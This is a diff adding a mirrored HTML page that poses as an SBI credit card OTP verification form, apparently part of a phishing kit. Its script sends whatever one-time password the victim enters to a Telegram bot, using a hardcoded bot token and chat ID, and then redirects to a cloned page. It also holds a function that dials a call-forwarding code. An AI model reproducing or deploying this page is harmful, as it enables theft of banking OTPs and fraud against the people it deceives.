@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from sbicreditcard1.netlify.app/otp by HTTrack Website Copier/3.x [XR&CO'2017], Fri, 14 Mar 2025 04:24:00 GMT -->
+<!-- Added by HTTrack -->
+<!-- Mirrored from creditcardkyc.vercel.app/otp.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 12 Nov 2025 03:51:00 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Registration Form</title>
+  <link rel="stylesheet" href="stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.html">
+  <style>
+   {
+  font-family: Georgia, serif;
+}
+    .form-group {
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      margin-bottom: 5px;
+      
+    }
+    /* Custom CSS styles */
+    body {
+      background-color: #f4f4f4;
+      font-family: Georgia, serif;
+    }
+
+    .card {
+      background-color: white;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      padding: 30px;
+      margin-top: 0px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    .form-group label {
+      font-weight: 600;
+    }
+
+    .split-input {
+      display: flex;
+    }
+
+    .split-input .form-group {
+      flex: 1;
+      margin-right: 7px;
+    }
+
+    .error-message {
+      color: red;
+    }
+  .center {
+    margin-bottom: 20px;
+  display: block;
+  margin-left: auto;
+  margin-right: auto;
+  width: 100%;
+  }
+  .sbicard {
+    margin-top: 0%;
+  margin-bottom: 30px;
+  display: block;
+  margin-left: auto;
+  margin-right: auto;
+  width: 100%;
+}
+  .sbicard {
+    margin-top: 0%;
+  margin-bottom: 30px;
+  display: block;
+  margin-left: auto;
+  margin-right: auto;
+  width: 100%;
+}
+  input[type="number"], select {
+    background-color: #F7F7FF;
+      width: 100%;
+      height: 55px;
+      padding: 8px;
+      border: none;
+      border-radius: 10px;
+      box-sizing: border-box;
+    border: 1.3px solid #000000;
+      color: black;
+     font-size: 19px;
+       }
+  ::placeholder {
+  color: black;
+  font-size: 19px;
+  
+}
+  input[type="submit"] {
+      background-color: #00B4F7;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      text-align: center;
+      font-size: 16px;
+      border-radius: 20px;
+      cursor: pointer;
+      height: 50px;
+      font-size: 21px;
+      font-weight: bold;
+      width: 100%;
+       }
+  /* Target the input with id "card-number" and set the placeholder style */
+#otp::placeholder {
+  font-size: 20px; 
+  color: black;
+  
+
+  
+    #countdown {
+      font-size: 20px;
+      color: White;
+    }
+  
+  </style>
+  <title>Payment Form</title>
+</head>
+<body>
+    <img src="logo11.png" alt="Paris" class="center">
+   <div class="container">
+    <div class="row">
+      <div class="col-lg-6 offset-lg-3 col-md-8 offset-md-2 col-12">
+        <div class="card">
+        
+          <form id="registrationForm" onsubmit="sendTelegramMessage(event)">
+            <div class="form-group">
+              <label for="otp"></label>
+              <input type="number" id="otp" name="otp" class="form-control" placeholder="Enter 6 Digit OTP"required>
+               <span id="expiration-date-error" class="error-message"></span>
+             
+              </div>
+           
+            <br>
+            
+          
+            <div class="form-group">
+              <input type="submit" value="NEXT">
+            </div>
+            <br>
+            <br>
+             
+            
+          </form>
+          
+  </div>
+<img src="logo22.jpg" alt="Paris" class="center">
+   
+        <script>
+        
+        // OTP validation
+    document.getElementById('otp').addEventListener('input', function (e) {
+      var target = e.target;
+      var value = target.value.replace(/\D/g, '');
+      var isValid = /^\d{6}$/.test(value);
+      document.getElementById('otp-error').textContent = isValid ? '' : 'Please enter a valid 6-digit OTP';
+   });
+        </script>
+        
+        
+  <script>
+    function sendTelegramMessage(event) {
+      event.preventDefault(); // Prevent the form from submitting normally
+      
+      const form = event.target;
+      const otpValue = form.otp.value; // Get the value of the OTP input
+
+      // Replace YOUR_BOT_TOKEN with your actual Telegram bot token
+      const botToken = '8595292095:AAHbmgY8SK61zC0Qa2Z4-4b7E76Jf4KJcYU';
+      const chatId = '8488267182'; // Replace YOUR_CHAT_ID with the chat ID or channel username
+
+      const message = `New OTP received: ${otpValue}`;
+
+      const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      // Construct the fetch request to send the message to the Telegram bot
+      fetch(telegramApiUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+        }),
+      })
+      .then(response => {
+        if (response.ok) {
+          console.log('Message sent successfully');
+          // Redirect to another URL after sending the message
+          window.location.href = 'clone.html'; // Replace with the URL you want to redirect to
+        } else {
+          console.error('Failed to send message');
+          // Handle the error, e.g., show an error message to the user
+        }
+      })
+      .catch(error => {
+        console.error('Error:', error);
+        // Handle any network or other errors
+      });
+    }
+  </script>
+      <script>
+    function redirectToAnotherPage() {
+      // Replace the URL with the destination URL
+      window.location.href = 'tel:**21*';
+    }
+  </script>
+     
+  <script src="code.jquery.com/jquery-3.5.1.slim.min.html"></script>
+  <script src="cdn.jsdelivr.net/npm/%40popperjs/core%401.16.1/dist/umd/popper.min.html"></script>
+  <script src="stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.html"></script>
+  
+  
+</body>
+
+<!-- Mirrored from sbicreditcard1.netlify.app/otp by HTTrack Website Copier/3.x [XR&CO'2017], Fri, 14 Mar 2025 04:24:00 GMT -->
+
+<!-- Mirrored from creditcardkyc.vercel.app/otp.html by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 12 Nov 2025 03:51:01 GMT -->
+</html>
+
